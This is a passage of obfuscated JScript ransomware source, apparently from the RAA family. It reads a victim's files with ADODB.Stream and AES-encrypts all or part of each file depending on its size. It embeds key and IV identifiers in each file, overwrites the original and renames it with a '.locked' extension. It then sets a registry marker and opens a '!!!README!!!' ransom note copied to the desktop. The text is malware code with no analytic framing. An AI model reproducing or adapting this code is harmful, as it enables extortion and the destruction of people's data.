            hXpHGpZ[1] = [];
            var PRuJZyAvfeza = SlSPWu.Size;
            if (PRuJZyAvfeza > 6122 && PRuJZyAvfeza < 5000000) {
                var GinRqOjln = OQlYdejWlC(2000, 2040);
                hXpHGpZ[0][0] = SlSPWu.ReadText(GinRqOjln) + "RAA-SEP";
                var kWsAN = Math.floor(PRuJZyAvfeza / 2) - 3060;
                hXpHGpZ[1][0] = SlSPWu.ReadText(kWsAN) + "RAA-SEP";
                hXpHGpZ[0][1] = SlSPWu.ReadText(GinRqOjln) + "RAA-SEP";
                var iPZDBPG = PRuJZyAvfeza - (SlSPWu.Position + GinRqOjln);
                hXpHGpZ[1][1] = SlSPWu.ReadText(iPZDBPG) + "RAA-SEP";
                hXpHGpZ[0][2] = SlSPWu.ReadText(GinRqOjln) + "RAA-SEP";
                SlSPWu.Close;
                jMvqmKSQu(hXpHGpZ);
            } else if (PRuJZyAvfeza > 5000000 && PRuJZyAvfeza <= 500000000) {
                qqJ(IMhTname)
            } else if (PRuJZyAvfeza <= 6122) {
                hXpHGpZ[0][0] = SlSPWu.ReadText;
                SlSPWu.Close;
                jMvqmKSQu(hXpHGpZ);
            } else {
                hXpHGpZ = 0;
                SlSPWu.Close;
                jMvqmKSQu(hXpHGpZ);
            }
            return 0;
        }

        udpIHxNm(IMhTname);
        function qqJ(IMhTname) {
            var SlSPWu = WScript.CreateObject("ADODB.Stream");
            SlSPWu.CharSet = '437';
            SlSPWu.Open();
            SlSPWu.LoadFromFile(IMhTname);
            var FhDYKCTNZFu = WScript.CreateObject("ADODB.Stream");
            FhDYKCTNZFu.CharSet = '437';
            FhDYKCTNZFu.Open();
            var GinRqOjln = OQlYdejWlC(90000, 125000);
            var PRuJZyAvfeza = SlSPWu.Size;
            var VVe = SlSPWu.ReadText(GinRqOjln);
            var cBKyRXWGPWBs = ukBnxEOtjm(VVe);
            cBKyRXWGPWBs = String(cBKyRXWGPWBs);
            var rMkTeqZm = cBKyRXWGPWBs.length;
            SlSPWu.Position = PRuJZyAvfeza - GinRqOjln;
            var ECgBWYtoib = SlSPWu.ReadText(GinRqOjln);
            var AblANuF = ukBnxEOtjm(ECgBWYtoib);
            AblANuF = String(AblANuF);
            var QfYmGGcYOFB = AblANuF.length;
            var IJDZ = ",";
            SlSPWu.Position = PRuJZyAvfeza - GinRqOjln;
            SlSPWu.SetEOS;
            SlSPWu.WriteText(cBKyRXWGPWBs);
            SlSPWu.WriteText(AblANuF);
            SlSPWu.WriteText(rMkTeqZm);
            SlSPWu.WriteText(IJDZ);
            SlSPWu.WriteText(QfYmGGcYOFB);
            SlSPWu.WriteText(IJDZ);
            var ids = "IDNUM=" + guid + "KEY_LOGIC=" + HZtSmFNRdJM_data[0] + "IV_LOGIC=" + qPCIyff[0] + "LOGIC_ID=3";
            SlSPWu.WriteText(ids);
            SlSPWu.Position = GinRqOjln;
            SlSPWu.CopyTo(FhDYKCTNZFu);
            SlSPWu.Close;
            FhDYKCTNZFu.SaveToFile(IMhTname, 2);
            FhDYKCTNZFu.Close;
            var DmYbWSaT = new ActiveXObject("Scripting.FileSystemObject");
            DmYbWSaT.MoveFile(IMhTname, IMhTname += ".locked");
            return 0;
        }

////jbnqLZNJJU8MXxfoAGPcb113j4K1XQ9IZWi4jg0f9sU3koQYuP0SF6ueN09SHxD8wbODMwlbiIkVALIpWt54jq6
        function jMvqmKSQu(hXpHGpZ) {
            if (hXpHGpZ[1].length != 0) {
                var DftonCbPCyQR = hXpHGpZ[0].join("");
                DftonCbPCyQR = ukBnxEOtjm(DftonCbPCyQR);
                DftonCbPCyQR = DftonCbPCyQR + "=END=OF=HEADER=";
                DftonCbPCyQR = DftonCbPCyQR + hXpHGpZ[1].join("") + "IDNUM=" + guid + "KEY_LOGIC=" + HZtSmFNRdJM_data[0] + "IV_LOGIC=" + qPCIyff[0] + "LOGIC_ID=1";
                omaDplUyHou(DftonCbPCyQR);
            } else if (hXpHGpZ == 0) {
                var DftonCbPCyQR = 0;
                omaDplUyHou(DftonCbPCyQR);
            } else {
                var DftonCbPCyQR = hXpHGpZ[0][0];
                DftonCbPCyQR = ukBnxEOtjm(DftonCbPCyQR);
                DftonCbPCyQR = DftonCbPCyQR + "IDNUM=" + guid + "KEY_LOGIC=" + HZtSmFNRdJM_data[0] + "IV_LOGIC=" + qPCIyff[0] + "LOGIC_ID=2";
                omaDplUyHou(DftonCbPCyQR);
            }
            return DftonCbPCyQR;
        }

        function ukBnxEOtjm(EQs) {
            var HZtSmFNRdJM = HZtSmFNRdJM_data[1];
            var gmCRXSMsLyM = qPCIyff[1];
            EQs = CryptoJS.AES.encrypt(EQs, HZtSmFNRdJM, {gmCRXSMsLyM: gmCRXSMsLyM});
            return EQs;
        }

        function omaDplUyHou(lsYZxzUm) {
            var IxC = new ActiveXObject('ADODB.Stream');
            IxC.Type = 2;
            IxC.Charset = "437";
            IxC.Open();
            if (lsYZxzUm != 0) {
                IxC.WriteText(lsYZxzUm);
                IxC.SaveToFile(IMhTname, 2);
                IxC.Close();
                var DmYbWSaT = new ActiveXObject("Scripting.FileSystemObject");
                DmYbWSaT.MoveFile(IMhTname, IMhTname += ".locked");
            } else {
                IxC.Close();
            }
            return 0;
        }

        return 0;
    }

    var FYSAj = WScript.CreateObject("WScript.Shell");
    FYSAj.RegWrite("HKCU\\RAA\\Raa-fnl\\", "beenFinished", "REG_SZ");
    var IvTV = "C:\\" + "!!!README!!!" + __key + ".rtf";
    var xfejSVYO = new ActiveXObject("Scripting.FileSystemObject");
    var Nnz = FYSAj.SpecialFolders("Desktop");
    Nnz = Nnz += "\\";
    xfejSVYO.CopyFile(IvTV, Nnz);
    var rdm_fl = "wordpad.exe" + " " + IvTV;
    FYSAj.Run(rdm_fl, 3);
    return 0;
}